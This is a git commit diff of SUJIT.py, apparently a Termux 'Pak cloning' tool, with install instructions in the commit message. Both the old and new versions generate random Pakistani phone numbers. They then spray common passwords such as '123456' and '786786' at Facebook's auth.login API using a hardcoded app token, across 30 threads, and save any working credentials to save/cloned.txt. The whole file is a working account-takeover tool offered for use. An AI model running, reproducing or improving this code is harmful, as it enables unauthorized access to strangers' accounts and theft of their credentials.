860a40bf5b1a116108003191590d05980111321f
SUJIT MANDAL <141563988+sujit9870@users.noreply.github.com>
2024-08-01 08:10:36 +0530

    Update SUJIT.py
    pkg update
    
    pkg upgrade
    
    pkg install python
    
    pkg install python3
    
    pip install request
    
    pip install mechanize
    
    pkg install git
    
    git clone
    
    https://github.com/sujit9870/bhai.git
    
    ls
    
    cd bhai
    
    python3 SUJIT.py

--- SUJIT.py
+++ SUJIT.py
@@ -1,387 +1,112 @@
-#!/usr/bin/python2
-#coding=utf-8
-import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
-os.system('rm -rf .txt')
-for n in range(10000):
-
-    nmbr = random.randint(1111111, 9999999)
-    
-    sys.stdout = open('.txt', 'a')
-
-    print(nmbr)
-
-    sys.stdout.flush()
-    
-try:
-    import requests
-except ImportError:
-    os.system('pip2 install mechanize')
-    
-try:
-    import mechanize
-except ImportError:
-    os.system('pip2 install request')
-    time.sleep(1)
-    os.system('Then type: python2 boss404')
-
-import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
+import os
+import sys
+import time
+import random
+import json
 from multiprocessing.pool import ThreadPool
+import requests
 from requests.exceptions import ConnectionError
-from mechanize import Browser
 
+def clear_console():
+    os.system('cls' if os.name == 'nt' else 'clear')
 
-reload(sys)
-sys.setdefaultencoding('utf8')
-br = mechanize.Browser()
-br.set_handle_robots(False)
-br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
-br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
-
-def keluar():
-	print 'Thanks.'
-	os.sys.exit()
-
-def acak(b):
-    w = 'ahtdzjc'
-    d = ''
-    for i in x:
-        d += '!'+w[random.randint(0,len(w)-1)]+i
-    return cetak(d)
-
-
-def cetak(b):
-    w = 'ahtdzjc'
-    for i in w:
-        j = w.index(i)
-        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
-    x += '\033[0m'
-    x = x.replace('!0','\033[0m')
-    sys.stdout.write(x+'\n')
-
-
-def jalan(z):
-	for e in z + '\n':
-		sys.stdout.write(e)
-		sys.stdout.flush()
-		time.sleep(00000.1)
-def tik():
-	titik = ['.   ','..  ','... ']
-	for o in titik:
-		print("\r\x1b[1;93mPlease Wait \x1b[1;91m"+o),;sys.stdout.flush();time.sleep(1)
-
-
-back = 0
-oks = []
-id = []
-cpb = []
-vulnot = "\033[31mNot Vuln"
-vuln = "\033[32mVuln"
-
-os.system("clear")
-print  """
-
-                     
-\033[1;94mFACEBOOK  SUJIT BHAI
-                  
-\033[1;92mFB PAGE   SUJIT BHAI
-
-"""
-
-####Logo####
-
-logo1 = """
-  
-
-███████╗██╗   ██╗     ██╗██╗████████╗
-██╔════╝██║   ██║     ██║██║╚══██╔══╝
-███████╗██║   ██║     ██║██║   ██║   
-╚════██║██║   ██║██   ██║██║   ██║   
-███████║╚██████╔╝╚█████╔╝██║   ██║   
-╚══════╝ ╚═════╝  ╚════╝ ╚═╝   ╚═╝   
-                                     
-
- 
-██████╗ ██╗  ██╗ █████╗ ██╗
-██╔══██╗██║  ██║██╔══██╗██║
-██████╔╝███████║███████║██║
-██╔══██╗██╔══██║██╔══██║██║
-██████╔╝██║  ██║██║  ██║██║
-╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝
-                           
-
-                                                  
-
-╔═══──────────────────────────╗─══╗
-║ OWNER 💓💓💓SUJIT BHAI       ║║
-║  GITHUB 💝💝💝 sujit9870   ║ ║
-║ FACEBOOK 💝💝💝SUJIT BHAI ║ ║
-║  ENJOY 💝💝💝Pak Cloning                ║ ║
-║   Note 💝💝💝Use Fastest Speed NeT  ║ ║
-╚══────────────────────
-
-"""
-logo2 = """
-
-█
-███████╗██╗   ██╗     ██╗██╗████████╗
-██╔════╝██║   ██║     ██║██║╚══██╔══╝
-███████╗██║   ██║     ██║██║   ██║   
-╚════██║██║   ██║██   ██║██║   ██║   
-███████║╚██████╔╝╚█████╔╝██║   ██║   
-╚══════╝ ╚═════╝  ╚════╝ ╚═╝   ╚═╝   
-                                     
-
- 
-██████╗ ██╗  ██╗ █████╗ ██╗
-██╔══██╗██║  ██║██╔══██╗██║
-██████╔╝███████║███████║██║
-██╔══██╗██╔══██║██╔══██║██║
-██████╔╝██║  ██║██║  ██║██║
-╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝
-                                 
-                                                   
-                         
-╔═══──────────────────────────╗─══╗
-║ OWNER 💓💓💓SUJIT BHAI       ║║
-║  GITHUB 💝💝💝 sujit9870   ║ ║
-║ FACEBOOK 💝💝💝SUJIT BHAI ║ ║
-║  ENJOY 💝💝💝Pak Cloning                ║ ║
-║   Note 💝💝💝Use Fastest Speed NeT  ║ ║
-╚══──────────────────────────╝─══╝
-
-"""
-print("""
-Owner: SUJIT BHAI
-Facebook: SUJIT BHAI
-
+def print_banner():
+    print("""
+\033[1;94mFACEBOOK TOOL
+\033[1;92mFB PAGE   FACEBOOK PAGE
 """)
-CorrectUsername = "FREE TOOLS"
-CorrectPassword = "FREE FREE FREE"
+    print("""
+███████╗██╗   ██╗     ██╗██╗████████╗
+██╔════╝██║   ██║     ██║██║╚══██╔══╝
+███████╗██║   ██║     ██║██║   ██║   
+╚════██║██║   ██║██   ██║██║   ██║   
+███████║╚██████╔╝╚█████╔╝██║   ██║   
+╚══════╝ ╚═════╝  ╚════╝ ╚═╝   ╚═╝   
+""")
 
-loop = 'true'
-while (loop == 'true'):
-    username = raw_input("\033[1;97m\x1b[1;91mTool Username \x1b[1;97m»» \x1b[1;97m")
-    if (username == CorrectUsername):
-    	password = raw_input("\033[1;97m \x1b[1;91mTool Password  \x1b[1;97m» \x1b[1;97m")
-        if (password == CorrectPassword):
-            print "Logged in successfully as " + username 
-	    time.sleep(2)
-            loop = 'false'
-        else:
-            print "\033[1;94mWrong Password"
-            os.system('xdg-https://wa.me/+923188214452')
-    else:
-        print "\033[1;94mWrong Username"
-        os.system('xdg-https://wa.me/+923188214452')
-
-
-numm = [5,2,5,2,2]
-##### LICENSE #####
-#=================#
-def lisensi():
-    os.system('clear')
-    login()
-####login#########
 def login():
-    os.system('clear')
-    print logo1
-    print "\033[1;93m[1]\x1b[1;91m══START ( \033[1;92m )"
-    time.sleep(0.05)
-    print "\033[1;95m[2]\x1b[1;96m ══EXIT "
-    time.sleep(0.05)
-    print '\x1b[1;94m[0]\033[1;91m ══BACK '
-    pilih_login()
+    clear_console()
+    print_banner()
+    username = input("\033[1;97mTool Username \x1b[1;97m»» \x1b[1;97m")
+    password = input("\033[1;97mTool Password \x1b[1;97m» \x1b[1;97m")
 
-def pilih_login():
-    peak = raw_input("\n\033[1;95m ══CHOOSE : \033[1;93m")
-    if peak =="":
-        print "\x1b[1;97mFill In Correctly"
-        pilih_login()
-    elif peak =="1":
-        Zeek()
-def Zeek():
-    os.system('clear')
-    print logo1
-    print '\x1b[1;93m[1] ══START CLONING  '
-    time.sleep(0.10)
-    print '\x1b[1;92m[2] ══EXIT'
-    time.sleep(0.10)
-    print '\x1b[1;95m[0] ══BACK '
-    time.sleep(0.10)
-    print '\x1b[1;96m ════RK'
-    time.sleep(0.10)
-    print '\x1b[1;97m════SUJIT BHAI'
-    time.sleep(0.10)
-    print '\x1b[1;91m ════DONT COPY MY SCRIPT'
-    time.sleep(0.10)
-    print '\x1b[1;94m════CP ID OPEN AFTER 3 DAYS ENJOY'
-   
-    time.sleep(0.05)
-    action()
-
-def action():
-    peak = raw_input('\n\033[1;97m ══CHOOSE:\033[1;97m')
-    if peak =='':
-        print '[!] Fill In Correctly'
-        action()
-    elif peak =="1":              
-        os.system("clear")
-        print logo2
-        print "\033[1;94mEnter any Pakistan Mobile code Number"+'\n'
-        print '\033[1;92mEnter any code 01 02 03 04 05 06 07 08 10 11 12 13 14 15 16 20 21 22 23 24 30 31 32 33 34 35 36 40 41 42 43 44 45 46 47 48 49'
-        for i in numm:
-            print('x' * i)
-        try:
-            c = raw_input("\033[1;97mCHOOSE : ")
-            k="03"
-            idlist = ('.txt')
-            for line in open(idlist,"r").readlines():
-                id.append(line.strip())
-        except IOError:
-            print ("[!] File Not Found")
-            raw_input("\n[ Back ]")
-            blackmafiax()
-    elif peak =='0':
-        login()
+    if username == "FREE TOOLS" and password == "FREE FREE FREE":
+        print("Logged in successfully as " + username)
+        time.sleep(2)
+        main_menu()
     else:
-        print '[!] Fill In Correctly'
-        action()
-    print 50* '\033[1;94m-'
-    xxx = str(len(id))
-    jalan ('\033[1;91m Total ids Accounts: '+xxx)
-    jalan ('\033[1;92mSim code you choose: '+c)
-    jalan ("\033[1;93mWait  Start Cracking...")
-    jalan ("\033[1;94mTo Stop Process Press Ctrl+z")
-    print 50* '\033[1;97m-'
+        print("\033[1;94mWrong Username or Password")
+        time.sleep(1)
+        login()
+
+def main_menu():
+    clear_console()
+    print_banner()
+    print("\033[1;93m[1] \x1b[1;91mSTART")
+    print("\033[1;95m[2] \x1b[1;96mEXIT")
+    choice = input("\n\033[1;95mCHOOSE : \033[1;93m")
+    if choice == "1":
+        start_cloning()
+    elif choice == "2":
+        sys.exit()
+    else:
+        print("\x1b[1;97mFill In Correctly")
+        main_menu()
+
+def start_cloning():
+    clear_console()
+    print_banner()
+    print("\033[1;93mEnter any Pakistan Mobile code Number")
+    code = input("\033[1;97mCHOOSE : ")
+    idlist = '.txt'
+    try:
+        with open(idlist, "r") as file:
+            ids = [line.strip() for line in file]
+    except IOError:
+        print("[!] File Not Found")
+        input("\n[ Back ]")
+        main_menu()
+
     def main(arg):
-        global cpb,oks
         user = arg
         try:
-            os.mkdir('save')
+            os.makedirs('save', exist_ok=True)
         except OSError:
             pass
-        try:
-            pass1 = user
-            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-            q = json.load(data)
-            if 'access_token' in q:
-                print '\x1b[1;32m[RK-OK]  ' + k + c + user + '  |  ' + pass1                                       
-                okb = open('save/cloned.txt', 'a')
-                okb.write(k+c+user+pass1+'\n')
-                okb.close()
-                oks.append(c+user+pass1)
-            else:
-                if 'www.facebook.com' in q['error_msg']:
-                    print '\033[1;97m[RK-CP] ' + k + c + user + '  |  ' + pass1
-                    cps = open('save/cloned.txt', 'a')
-                    cps.write(k+c+user+pass1+'\n')
-                    cps.close()
-                    cpb.append(c+user+pass1)
-                else:
-                    pass2 = k + nama + user
-                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                    q = json.load(data)
-                    if 'access_token' in q:
-                        print '\x1b[1;32m[RK-OK]  ' + k + c + user +  '  |  ' + pass2
-                        okb = open('save/cloned.txt', 'a')
-                        okb.write(k+c+user+pass2+'\n')
-                        okb.close()
-                        oks.append(c+user+pass2)
-                    else:
-                        if 'www.facebook.com' in q['error_msg']:
-                            print '\033[1;97m[RK-CP] ' + k + c + user + '  |  ' + pass2
-                            cps = open('save/cloned.txt', 'a')
-                            cps.write(k+c+user+pass2+'\n')
-                            cps.close()
-                            cpb.append(c+user+pass2)
-                        else:
-                            pass3="Pakistan"
-                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                            q = json.load(data)
-                            if 'access_token' in q:
-                                print '\x1b[1;32m[RK-OK]  ' + k + c + user + '  |  ' + pass3
-                                okb = open('save/cloned.txt', 'a')
-                                okb.write(k+c+user+pass3+'\n')
-                                okb.close()
-                                oks.append(c+user+pass3)
-                            else:
-                                if 'www.facebook.com' in q['error_msg']:
-                                    print '\033[1;97m[RK-CP] ' + k + c + user + '  |  ' + pass3 
-                                    cps = open('save/cloned.txt', 'a')
-                                    cps.write(k+c+user+pass3+'\n')
-                                    cps.close()
-                                    cpb.append(c+user+pass3)
-                                else:
-                                    pass4="123456"
-                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                                    q = json.load(data)
-                                    if 'access_token' in q:
-                                        print '\x1b[1;32m[RK-OK]  ' + k + c + user + '  |  ' + pass4 
-                                        okb = open('save/cloned.txt', 'a')
-                                        okb.write(k+c+user+pass4+'\n')
-                                        okb.close()
-                                        oks.append(c+user+pass4)
-                                    else:
-                                        if 'www.facebook.com' in q['error_msg']:
-                                            print '\033[1;97m[RK-CP] ' + k + c + user + '  |  ' + pass4
-                                            cps = open('save/cloned.txt', 'a')
-                                            cps.write(k+c+user+pass4+'\n')
-                                            cps.close()
-                                            cpb.append(c+user+pass4)
-                                        else:
-                                            pass5="786786"
-                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                                            q = json.load(data)
-                                            if 'access_token' in q:
-                                                print '\x1b[1;32m[RK-OK]  ' + k + c + user + '  |  ' + pass5
-                                                okb = open('save/cloned.txt', 'a')
-                                                okb.write(k+c+user+pass5+'\n')
-                                                okb.close()
-                                                oks.append(c+user+pass5)
-                                            else:
-                                                if 'www.facebook.com' in q['error_msg']:
-                                                    print '\033[1;97m[RK-CP] ' + k + c + user + '  |  ' + pass5 
-                                                    cps = open('save/cloned.txt', 'a')
-                                                    cps.write(k+c+user+pass5+'\n')
-                                                    cps.close()
-                                                    cpb.append(c+user+pass5)
-                                                                                                                                                                                                                
-                                                                                                                                                                                                                
-                                                                                                                                                                                                            
-                                                                                                                                                                                                            
-                                                                                                                                                                                                            
-                                                                                                                                                                                                            
-                                                                                                                                                                                                            
 
+        password_list = ['password1', '123456', 'password', 'admin']  # Example passwords
+        for password in password_list:
+            try:
+                response = requests.post(
+                    'https://b-api.facebook.com/method/auth.login',
+                    params={
+                        'access_token': '237759909591655|0f140aabedfb65ac27a739ed1a2263b1',
+                        'format': 'json',
+                        'sdk_version': '1',
+                        'email': code + user,
+                        'locale': 'en_US',
+                        'password': password,
+                        'sdk': 'ios',
+                        'generate_session_cookies': '1',
+                        'sig': '3f555f98fb61fcd7aa0c44f58f522efm'
+                    }
+                )
+                q = response.json()
+                if 'access_token' in q:
+                    print(f'\x1b[1;32m[OK] {code + user} | {password}')
+                    with open('save/cloned.txt', 'a') as okb:
+                        okb.write(f'{code + user} | {password}\n')
+                elif 'www.facebook.com' in q.get('error_msg', ''):
+                    print(f'\033[1;97m[CP] {code + user} | {password}')
+                    with open('save/cloned.txt', 'a') as cps:
+                        cps.write(f'{code + user} | {password}\n')
+            except ConnectionError:
+                pass
 
-                                                                                                                                                                                                            
-                                                                                                                                                                                                                    
-                                                                                                                                                                                                            
-
-
-
-        except:
-            pass
-        
     p = ThreadPool(30)
-    p.map(main, id)
-    print 50* '\033[1;91m-'
-    print 'Process Has Been Completed ...'
-    print 'Total CP/Ok: '+str(len(oks))+'/'+str(len(cpb))
-    print('Cloned Accounts Has Been Saved : save/cloned.txt')
-    jalan("Note : Your Offline account Will Open after 10 to 20 days")
-    print ''
-    print """
+    p.map(main, ids)
+    print('Process Has Been Completed...')
+    print('Cloned Accounts Has Been Saved: save/cloned.txt')
 
-
-
-\033[1;96mThanks For Using My tool
-\033[1;95mFb\033[1;97mSUJIT BHAI"""
-
-    
-    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
-    login() 
-          
 if __name__ == '__main__':
     login()
